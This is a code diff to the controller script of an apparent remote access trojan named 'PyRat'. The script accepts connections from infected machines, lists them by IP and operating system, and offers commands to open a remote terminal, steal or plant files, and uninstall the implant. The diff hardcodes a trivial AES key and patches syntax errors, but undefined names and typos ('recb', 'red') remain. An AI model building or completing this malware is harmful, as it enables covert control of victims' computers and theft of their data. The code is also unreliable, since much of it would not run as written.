@@ -15,7 +15,7 @@ from Crypto.Hash import SHA256
 
 #Variables
 port = 80                    #Connection Port
-key = ""                     #Encryption key (16 characters) use the same on server script
+key = "0123456789101112"                     #Encryption key (16 characters) use the same on server script
 banner = '''
  _______   __      __
 |   _   |  \ \    / /
@@ -35,6 +35,8 @@ download <Path_file> <Path_to_past>     - Download a file from client
 upload <Path_file> <Path_to_past>       - Upload a file to client
 (don't forget .extension in path)
 remove                                  - Remove the RAT from client
+
+quit                                    -Close server
 '''
 
 
@@ -45,17 +47,20 @@ class Server(threading.Thread):
     clients = {}            #Create an empty dictionary
     
     def __init__(self, port):
-        Thread.__init__()
+        threading.Thread.__init__(self)
         self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #parameters | really required?
         self.soc.bind(("", port))
+        self.soc.listen(5)
         
     def run(self):
+        #print("Server is listening")
         self.soc.listen(5)
         while True:
             clientsocket, address = self.soc.accept()           #obtain infos from client: ip, os
-            client_id = self.clients_counter
-            client_os = decrypt(key, self.soc.recv(4096))
+            #print("conection accepted")
+            client_id = self.client_count
+            client_os = decrypt(key, clientsocket.recv(4096))
             client = Client(clientsocket, address, client_id, client_os)
             self.clients[client_id] = client
             self.client_count += 1
@@ -63,11 +68,12 @@ class Server(threading.Thread):
     def print_clients_list(self):
         list = []
         i = 1
-        while i < client_count:
+        while i < self.client_count:
             clientUsed = self.clients[i]
             print("ID: ", clientUsed.id, "|IP: ", clientUsed.address, "|OS: ", clientUsed.os)
-        #    list.append(self.clients[i])
-        #return list
+            list.append(self.clients[i])
+            i += 1
+        return list
         
     def select_client(self, client_id):
         try:
@@ -105,14 +111,14 @@ class Client():
         pathToDownload = "upload " + str(path_file)
         self.connection.send(encrypt(key, "upload"))
         data_bytes = []
-        continue = True
+        ctn = True
         i = 1
         received = ""
         received = soc.recv(4096)
         #received = decrypt(key, received)
         #name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
         size = received[1]
-        while continue:
+        while ctn:
             received = soc.recb(4096)
             i += 1
             if received == b"Upload finished":
@@ -128,42 +134,44 @@ class Client():
                         file.close()
                     i += 1
                     if i == len(data_bytes):
-                        continue = False
+                        ctn = False
             else:
                 data_bytes.append(received)
             if not received:
-                continue = False
+                ctn = False
         
     def upload(self, path_file, path_to_past):
         #test if the file exist
+        True
         try:
             file = open(path_file, "rb")
             file.close
         except:
             print("File does not exist!")
-            break
-        soc.send(encrypt(key, "download"))
-        octets = os.path.getsize(path_file) / 1024
-        info = (path_to_past, octets)
-        soc.send(encrypt(key, info))
-        num = 0
-        octets = octets * 1024
-        file = open(path_file, "rb") #open file in read only and binary mod
-        if octets > 1024:
-            if (octets / 1024) != 0:
-                octets = round(octets / 1024 + 1)
+            do = False
+        if do:
+            soc.send(encrypt(key, "download"))
+            octets = os.path.getsize(path_file) / 1024
+            info = (path_to_past, octets)
+            soc.send(encrypt(key, info))
+            num = 0
+            octets = octets * 1024
+            file = open(path_file, "rb") #open file in read only and binary mod
+            if octets > 1024:
+                if (octets / 1024) != 0:
+                    octets = round(octets / 1024 + 1)
+                else:
+                    octets = octets / 1024
+                for i in range(octets):
+                    file.seek(num, 0)
+                    donnees = file.read(1024)
+                    soc.send(encrypt(key, donnees))
+                    num += 1024
             else:
-                octets = octets / 1024
-            for i in range(octets):
-                file.seek(num, 0)
-                donnees = file.read(1024)
-                soc.send(encrypt(key, donnees))
-                num += 1024
-        else:
-            donnees = file.read()
-            soc.send(donnees)
-        file.close
-        soc.send(encrypt(key, "Upload finished"))
+                donnees = file.read()
+                soc.send(donnees)
+            file.close
+            soc.send(encrypt(key, "Upload finished"))
 
         
         
@@ -177,7 +185,7 @@ def encrypt(key, plaintext):
 	
     iv = Random.new().red(AES.block_size)
     cipher = AES.new(key, AES.MODE_CBC, iv)
-	return iv + cipher.encrypt(plaintext)
+    return iv + cipher.encrypt(plaintext)
 
 def decrypt(key, ciphertext):
     iv = ciphertext[:AES.block_size]
@@ -194,20 +202,24 @@ def main():
     #start server
     server = Server(port)
     server.daemon = True
-    server.start
+    server.start()
     
     print("Welcome to PyRat")
     print(commands)
     while True:
-        cmd = input()
+        cmd = input(">>>")
         cmd = cmd.split( )
         if cmd[0] == "help":
             print(commands)
         elif cmd[0] == "clients":
-            server.print_clients_list()
+            list = server.print_clients_list()
+            #for i in list:
+            #    clientUsed = self.clients[i]
+            #    print("ID: ", clientUsed.id, "|IP: ", clientUsed.address, "|OS: ", clientUsed.os)
         elif cmd[0] == "client":
             try:
                 clientUsed = server.select_client(cmd[1])
+                print("Connected to {}".format(clientUsed.address))
             except:
                 print("Sorry, this ID does not exist")
         elif cmd[0] == "terminal":
@@ -227,8 +239,10 @@ def main():
                 pass
         elif cmd[0] == "remove":
             clientUsed.uninstall()
-        #elif cmd[0] == "":
-        
+        elif cmd[0] == "quit":
+            break
+
+    #server.join()
 
 if __name__ == "__main__":
 	main()
